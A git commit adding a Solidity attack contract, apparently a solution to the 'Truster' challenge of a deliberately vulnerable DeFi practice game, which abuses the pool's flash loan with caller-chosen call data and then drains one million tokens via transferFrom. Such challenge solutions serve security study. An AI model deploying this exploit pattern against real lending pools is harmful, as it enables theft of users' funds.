da8d6cea3c0e4ec8f936ce54354090cf91218234
erion <erionrb@gmail.com>
2023-03-25 19:25:09 -0300

    added selfie solution plus attack contracts

---
+++ contracts/attacker-contracts/AttackTruster.sol
@@ -0,0 +1,28 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../truster/TrusterLenderPool.sol";
+
+contract AttackTruster {
+    TrusterLenderPool trust;
+    IERC20 public immutable damnValuableToken;
+
+    constructor(address _trust, address tokenAddress) {
+        trust = TrusterLenderPool(_trust);
+        damnValuableToken = IERC20(tokenAddress);
+    }
+
+    function attack(
+        uint256 amount,
+        address borrower,
+        address target,
+        bytes calldata data
+    ) external {
+        trust.flashLoan(amount, borrower, target, data);
+        damnValuableToken.transferFrom(
+            address(trust),
+            msg.sender,
+            1000000 ether
+        );
+    }
+}
